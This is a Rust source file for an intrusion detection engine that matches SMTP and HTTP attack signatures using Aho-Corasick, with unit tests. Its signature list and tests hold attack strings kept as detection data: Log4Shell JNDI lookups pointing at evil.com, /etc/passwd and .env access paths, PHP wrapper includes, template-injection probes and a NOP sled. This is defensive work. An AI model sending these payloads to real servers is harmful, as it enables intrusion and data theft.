//! Signature-based detection engine
//!
//! Compiles attack signatures into an Aho-Corasick automaton for O(n)
//! multi-pattern scanning of packet payloads.

use aho_corasick::{AhoCorasick, AhoCorasickBuilder, MatchKind};
use serde::{Deserialize, Serialize};

/// Action to take when a signature matches
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum SignatureAction {
    /// Generate alert only
    Alert,
    /// Drop the packet/connection
    Drop,
    /// Send TCP RST / ICMP unreachable
    Reject,
    /// Pass (explicitly allow, used for exceptions)
    Pass,
}

/// Severity level
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum SigSeverity {
    /// Informational
    Info = 1,
    /// Low severity
    Low = 2,
    /// Medium severity
    Medium = 3,
    /// High severity
    High = 4,
    /// Critical
    Critical = 5,
}

/// A single IDS signature
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Signature {
    /// Signature ID (SID)
    pub sid: u32,
    /// Revision
    pub rev: u32,
    /// Human-readable message
    pub message: String,
    /// Content patterns to match (all must be present; binary byte sequences supported)
    pub content_patterns: Vec<Vec<u8>>,
    /// Action on match
    pub action: SignatureAction,
    /// Severity
    pub severity: SigSeverity,
    /// Category (e.g., "exploit", "malware", "policy-violation")
    pub category: String,
    /// Protocol filter (tcp, udp, smtp, http, any)
    pub protocol: String,
    /// CVE references
    pub references: Vec<String>,
}

/// Compiled signature set with Aho-Corasick automaton
pub struct SignatureSet {
    /// The compiled automaton
    automaton: Option<AhoCorasick>,
    /// Pattern index -> signature mapping
    pattern_to_sig: Vec<usize>,
    /// All signatures
    signatures: Vec<Signature>,
}

impl SignatureSet {
    /// Create a new signature set from a list of signatures
    pub fn new(signatures: Vec<Signature>) -> Result<Self, String> {
        if signatures.is_empty() {
            return Ok(Self {
                automaton: None,
                pattern_to_sig: Vec::new(),
                signatures,
            });
        }

        let mut all_patterns = Vec::new();
        let mut pattern_to_sig = Vec::new();

        for (sig_idx, sig) in signatures.iter().enumerate() {
            for pattern in &sig.content_patterns {
                all_patterns.push(pattern.clone());
                pattern_to_sig.push(sig_idx);
            }
        }

        let automaton = AhoCorasickBuilder::new()
            .match_kind(MatchKind::LeftmostFirst)
            // Text-based patterns (Log4Shell, SSTI, SMTP commands, etc.) must
            // match regardless of case. ASCII case-folding does NOT affect bytes
            // outside the A-Z/a-z range, so binary patterns (e.g. NOP sled 0x90)
            // are unaffected.
            .ascii_case_insensitive(true)
            .build(&all_patterns)
            .map_err(|e| format!("Failed to build automaton: {}", e))?;

        Ok(Self {
            automaton: Some(automaton),
            pattern_to_sig,
            signatures,
        })
    }

    /// Scan a payload against all signatures.
    /// Returns matched signature indices.
    pub fn scan(&self, payload: &[u8]) -> Vec<ScanMatch> {
        let automaton = match &self.automaton {
            Some(a) => a,
            None => return Vec::new(),
        };

        let mut matched_sigs = std::collections::HashSet::new();
        let mut results = Vec::new();

        for mat in automaton.find_iter(payload) {
            let sig_idx = self.pattern_to_sig[mat.pattern().as_usize()];
            if matched_sigs.insert(sig_idx) {
                let sig = &self.signatures[sig_idx];
                results.push(ScanMatch {
                    sid: sig.sid,
                    message: sig.message.clone(),
                    action: sig.action,
                    severity: sig.severity,
                    category: sig.category.clone(),
                    offset: mat.start(),
                });
            }
        }

        results
    }

    /// Number of loaded signatures
    pub fn signature_count(&self) -> usize {
        self.signatures.len()
    }
}

/// Result of a signature scan match
#[derive(Debug, Clone)]
pub struct ScanMatch {
    /// Signature ID
    pub sid: u32,
    /// Alert message
    pub message: String,
    /// Action
    pub action: SignatureAction,
    /// Severity
    pub severity: SigSeverity,
    /// Category
    pub category: String,
    /// Byte offset where first match occurred
    pub offset: usize,
}

/// Built-in signatures for common SMTP and mail-server attacks.
///
/// Design notes:
/// - SID 2000001 was removed: "EHLO " fires on every legitimate SMTP connection,
///   causing alert fatigue. Buffer-overflow detection is handled by protocol_analyzer
///   checking line lengths (>512 bytes per RFC 5321).
/// - NOP sled pattern uses actual 0x90 bytes, NOT the string literal `\\x90`.
pub fn builtin_mail_signatures() -> Vec<Signature> {
    vec![
        Signature {
            sid: 2000002,
            rev: 2,
            message: "SMTP: NOP-sled shellcode detected in mail body".into(),
            // FIXED: actual 0x90 bytes stored as Vec<u8>, not a String literal
            content_patterns: vec![b"\x90\x90\x90\x90\x90\x90\x90\x90".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "exploit".into(),
            protocol: "smtp".into(),
            references: vec![],
        },
        Signature {
            sid: 2000003,
            rev: 1,
            message: "SMTP: VRFY command enumeration".into(),
            content_patterns: vec![b"VRFY ".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "reconnaissance".into(),
            protocol: "smtp".into(),
            references: vec![],
        },
        Signature {
            sid: 2000004,
            rev: 1,
            message: "SMTP: EXPN command enumeration".into(),
            content_patterns: vec![b"EXPN ".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "reconnaissance".into(),
            protocol: "smtp".into(),
            references: vec![],
        },
        Signature {
            sid: 2000010,
            rev: 1,
            message: "HTTP: /etc/passwd access attempt".into(),
            content_patterns: vec![b"/etc/passwd".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec![],
        },
        Signature {
            sid: 2000011,
            rev: 1,
            message: "HTTP: .env file access attempt".into(),
            content_patterns: vec![b"/.env".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::High,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec![],
        },
        Signature {
            sid: 2000012,
            rev: 1,
            message: "HTTP: Log4Shell JNDI injection attempt (CVE-2021-44228)".into(),
            content_patterns: vec![b"${jndi:".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec!["CVE-2021-44228".into()],
        },
        Signature {
            // Obfuscated Log4Shell variants break the ${jndi: prefix across nested
            // lookups (e.g. ${j${::-n}di:ldap://evil.com/x}) but the JNDI protocol
            // URL still appears in cleartext. Detecting jndi:<proto>:// catches
            // most obfuscated payloads regardless of how the prefix is mangled.
            sid: 2000017,
            rev: 1,
            message: "HTTP: Log4Shell obfuscated JNDI protocol URL (CVE-2021-44228)".into(),
            content_patterns: vec![
                b"jndi:ldap://".to_vec(),
                b"jndi:ldaps://".to_vec(),
                b"jndi:rmi://".to_vec(),
                b"jndi:dns://".to_vec(),
                b"jndi:iiop://".to_vec(),
                b"jndi:corba://".to_vec(),
            ],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec!["CVE-2021-44228".into()],
        },
        Signature {
            sid: 2000013,
            rev: 1,
            message: "HTTP: Spring4Shell exploitation pattern (CVE-2022-22965)".into(),
            content_patterns: vec![b"class.module.classLoader".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec!["CVE-2022-22965".into()],
        },
        Signature {
            sid: 2000014,
            rev: 1,
            message: "HTTP: .git directory exposure attempt".into(),
            content_patterns: vec![b"/.git/".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::High,
            category: "exploit".into(),
            protocol: "http".into(),
            references: vec![],
        },
        Signature {
            sid: 2000015,
            rev: 1,
            message: "HTTP: PHP remote file include (RFI) attempt".into(),
            content_patterns: vec![b"php://input".to_vec(), b"php://filter".to_vec()],
            action: SignatureAction::Drop,
            severity: SigSeverity::Critical,
            category: "rfi".into(),
            protocol: "http".into(),
            references: vec![],
        },
        Signature {
            sid: 2000016,
            rev: 1,
            message: "HTTP: Server-side template injection (SSTI) pattern".into(),
            content_patterns: vec![b"{{7*7}}".to_vec(), b"{{config}}".to_vec(), b"${7*7}".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::High,
            category: "ssti".into(),
            protocol: "http".into(),
            references: vec![],
        },
        Signature {
            sid: 2000020,
            rev: 1,
            message: "DNS: Oversized query (possible amplification)".into(),
            content_patterns: vec![],
            action: SignatureAction::Alert,
            severity: SigSeverity::Medium,
            category: "dos".into(),
            protocol: "dns".into(),
            references: vec![],
        },
        Signature {
            sid: 2000030,
            rev: 1,
            message: "TLS: SSLv2/SSLv3 handshake (insecure protocol)".into(),
            content_patterns: vec![],
            action: SignatureAction::Alert,
            severity: SigSeverity::High,
            category: "policy-violation".into(),
            protocol: "tls".into(),
            references: vec!["CVE-2014-3566".into()],
        },
        Signature {
            sid: 2000040,
            rev: 1,
            message: "SMTP: AUTH PLAIN credential brute-force pattern".into(),
            content_patterns: vec![b"AUTH PLAIN ".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Low,
            category: "brute-force".into(),
            protocol: "smtp".into(),
            references: vec![],
        },
        Signature {
            sid: 2000041,
            rev: 1,
            message: "SMTP: Suspicious RCPT TO bulk recipient (possible spam relay probe)".into(),
            content_patterns: vec![b"RCPT TO:<postmaster@".to_vec()],
            action: SignatureAction::Alert,
            severity: SigSeverity::Low,
            category: "spam".into(),
            protocol: "smtp".into(),
            references: vec![],
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_signature_matching() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        // VRFY is a recon technique; must match
        let payload = b"VRFY admin\r\n";
        let matches = set.scan(payload);
        assert!(!matches.is_empty());
        assert_eq!(matches[0].sid, 2000003);
    }

    #[test]
    fn test_nop_sled_detects_actual_bytes() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        // Must match the ACTUAL 0x90 byte sequence, NOT the ASCII literal string
        let payload: &[u8] = &[
            b'D', b'A', b'T', b'A', b'\r', b'\n',
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        ];
        let matches = set.scan(payload);
        assert!(!matches.is_empty(), "NOP sled must be detected in binary payload");
        assert!(matches.iter().any(|m| m.sid == 2000002), "Expected SID 2000002");
    }

    #[test]
    fn test_nop_sled_does_not_trigger_on_literal_string() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        // The old broken pattern matched THIS text string — not real 0x90 bytes
        let payload = b"\\x90\\x90\\x90\\x90 (this is just the text literal)";
        let matches = set.scan(payload);
        // This text payload has NO actual 0x90 bytes — should NOT match NOP sled sig
        assert!(!matches.iter().any(|m| m.sid == 2000002),
            "Text backslash-x90 must NOT trigger the binary NOP sled signature");
    }

    #[test]
    fn test_log4shell_detection() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        let payload = b"GET /?q=${jndi:ldap://evil.com/x} HTTP/1.1\r\n";
        let matches = set.scan(payload);
        assert!(!matches.is_empty(), "Log4Shell pattern must be detected");
        assert!(matches.iter().any(|m| m.sid == 2000012));
    }

    #[test]
    fn test_ehlo_not_false_positive() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        // Normal legitimate EHLO must NOT fire (old SID 2000001 was removed)
        let payload = b"EHLO mail.example.com\r\n";
        let matches = set.scan(payload);
        assert!(!matches.iter().any(|m| m.sid == 2000001),
            "Normal EHLO greeting must NOT generate a false-positive alert");
    }

    #[test]
    fn test_no_match() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        let payload = b"HELO normal.host.com\r\n";
        let matches = set.scan(payload);
        // Clean HELO should produce no matches
        assert!(matches.is_empty(), "Clean HELO must not match any signature");
    }

    #[test]
    fn test_multiple_matches() {
        let sigs = builtin_mail_signatures();
        let set = SignatureSet::new(sigs).expect("compile sigs");
        let payload = b"VRFY admin\r\nEXPN all-users\r\n";
        let matches = set.scan(payload);
        assert!(matches.len() >= 2);
    }
}
